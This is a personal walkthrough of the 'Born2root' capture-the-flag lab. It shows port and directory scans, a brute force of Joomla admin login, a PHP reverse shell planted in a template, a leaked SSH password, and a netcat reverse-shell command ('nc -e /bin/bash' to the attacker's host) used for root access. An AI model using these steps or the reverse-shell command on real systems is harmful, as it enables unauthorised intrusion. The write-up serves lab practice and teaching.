@@ -1,0 +1,151 @@
+└─$ nmap -p- 192.168.56.118 --min-rate 900                     
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 23:06 PST
+Nmap scan report for 192.168.56.118
+Host is up (0.000084s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+60894/tcp open  unknown
+
+//after some checks on the open ports, no findings. so start from 80 port.
+─$ sudo dirsearch -u http://192.168.56.118 
+[23:08:02] 301 -  314B  - /css  ->  http://192.168.56.118/css/              
+[23:08:04] 200 - 1015B  - /gulpfile.js                                      
+[23:08:05] 301 -  314B  - /img  ->  http://192.168.56.118/img/              
+[23:08:06] 301 -  321B  - /javascript  ->  http://192.168.56.118/javascript/
+[23:08:06] 301 -  317B  - /joomla  ->  http://192.168.56.118/joomla/        
+[23:08:06] 301 -  331B  - /joomla/administrator  ->  http://192.168.56.118/joomla/administrator/
+[23:08:06] 200 -  476B  - /js/                                              
+[23:08:06] 200 -    3KB - /joomla/                                          
+[23:08:06] 200 -    1KB - /LICENSE                                          
+[23:08:08] 301 -  317B  - /manual  ->  http://192.168.56.118/manual/        
+[23:08:08] 200 -  201B  - /manual/index.html
+[23:08:10] 200 -    1KB - /package.json                                     
+[23:08:10] 200 -  246KB - /package-lock.json                                
+[23:08:12] 200 -    4KB - /README.md        
+
+//a  dir 'joomla' here needs further ennumration
+23:09:17] 403 -  300B  - /joomla/.php                                      
+[23:09:22] 301 -  331B  - /joomla/administrator  ->  http://192.168.56.118/joomla/administrator/
+[23:09:22] 200 -    2KB - /joomla/administrator/                            
+[23:09:22] 200 -   31B  - /joomla/administrator/cache/                      
+[23:09:22] 200 -  539B  - /joomla/administrator/includes/
+[23:09:22] 200 -    2KB - /joomla/administrator/index.php                   
+[23:09:22] 200 -   31B  - /joomla/administrator/logs/                       
+[23:09:22] 301 -  336B  - /joomla/administrator/logs  ->  http://192.168.56.118/joomla/administrator/logs/
+[23:09:24] 301 -  321B  - /joomla/bin  ->  http://192.168.56.118/joomla/bin/
+[23:09:24] 200 -   31B  - /joomla/bin/                                      
+[23:09:24] 200 -   31B  - /joomla/cache/                                    
+[23:09:24] 301 -  323B  - /joomla/cache  ->  http://192.168.56.118/joomla/cache/
+[23:09:25] 200 -   31B  - /joomla/cli/                                      
+[23:09:25] 200 -   31B  - /joomla/components/    
+
+
+//we got a login page, adminxxx/index.php, we use joomscan ,but nothing found.
+//try to dict force the login page, with the default user : admin, the password we want to crawl the words from the joomla page.
+cewl http://192.168.56.118//joomla/administrator/index.php > dict.txt
+  //hydra sucks, I cannot use it here, for the reason of it needs a reponse string, but nothing response from server, it will pop up a new page for login result.
+  //Have to use burps intruder. Here a powerful tool is needed.
+  // got the credential pairs: admin travel
+  
+//after login, we find  Beez3 - Default is the templates used by default, whichis a php file, and we can modify it.
+// so we try to change the source code in the page with a php reverse shell. and listen on the host. we got a www-data shell.
+
+//after some searches, nothing found, until a folder under /opt/ scripts/fileshare.py
+cat fileshare.py
+cat fileshare.py
+#!/usr/bin/env python
+
+import sys, paramiko
+
+if len(sys.argv) < 5:
+    print "args missing"
+    sys.exit(1)
+
+hostname = "localhost"
+password = "lulzlol"
+source = "/var/www/html/joomla"
+dest = "/tmp/backup/joomla"
+
+username = "tim"
+port = 22
+
+try:
+    t = paramiko.Transport((hostname, port))
+    t.connect(username=username, password=password)
+    sftp = paramiko.SFTPClient.from_transport(t)
+    sftp.get(source, dest)
+
+finally:
+    t.close()
+
+//easily, a ssh credential here, tim lulzol
+tim@born2root:~$ sudo -l
+[sudo] password for tim: 
+Matching Defaults entries for tim on born2root:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User tim may run the following commands on born2root:
+    (ALL : ALL) ALL
+
+//we can run all commands as root by using tim,
+
+tim@born2root:~$ nc -e /bin/bash 192.168.56.118 8821
+(UNKNOWN) [192.168.56.118] 8821 (?) : Connection refused
+tim@born2root:~$ sudo nc -e /bin/bash 192.168.56.105 8821
+
+//so we start a new shell with sudo privi,
+─$ nc -nvlp 8821                                              
+listening on [any] 8821 ...
+connect to [192.168.56.105] from (UNKNOWN) [192.168.56.118] 36960
+id
+uid=0(root) gid=0(root) groups=0(root)
+python -c 'import pty;pty.spawn("/bin/bash")'
+root@born2root:/home/tim# ls
+ls
+root@born2root:/home/tim# cd /root
+cd /root
+root@born2root:~# ls
+ls
+flag.txt
+root@born2root:~# cat flag.txt
+cat flag.txt
+
+             .andAHHAbnn.
+           .aAHHHAAUUAAHHHAn.
+          dHP^~"        "~^THb.
+    .   .AHF                YHA.   .
+    |  .AHHb.              .dHHA.  |
+    |  HHAUAAHAbn      adAHAAUAHA  |
+    I  HF~"_____        ____ ]HHH  I
+   HHI HAPK""~^YUHb  dAHHHHHHHHHH IHH
+   HHI HHHD> .andHH  HHUUP^~YHHHH IHH
+   YUI ]HHP     "~Y  P~"     THH[ IUP
+    "  `HK                   ]HH'  "
+        THAn.  .d.aAAn.b.  .dHHP
+        ]HHHHAAUP" ~~ "YUAAHHHH[
+        `HHP^~"  .annn.  "~^YHH'
+         YHb    ~" "" "~    dHF
+          "YAb..abdHHbndbndAP"
+           THHAAb.  .adAHHF
+            "UHHHHHHHHHHU"
+              ]HHUUHHHHHH[
+            .adHHb "HHHHHbn.
+     ..andAAHHHHHHb.AHHHHHHHAAbnn..
+.ndAAHHHHHHUUHHHHHHHHHHUP^~"~^YUHHHAAbn.
+  "~^YUHHP"   "~^YUHHUP"        "^YUP^"
+       ""         "~~"
+
+
+W00t w00t ! If you are reading this text  then Congratulations !!
+
+I hope you liked the second episode of 'Born2root' if you liked it please ping me in Twitter @h4d3sw0rm .
+
+If you want to try more boxes like this created by me , try this new sweet lab called 'Wizard-Labs' which is a platform which hosts many boot2root machines to improve your pentesting skillset https://labs.wizard-security.net !
+Until we meet again :-)
+
+
+
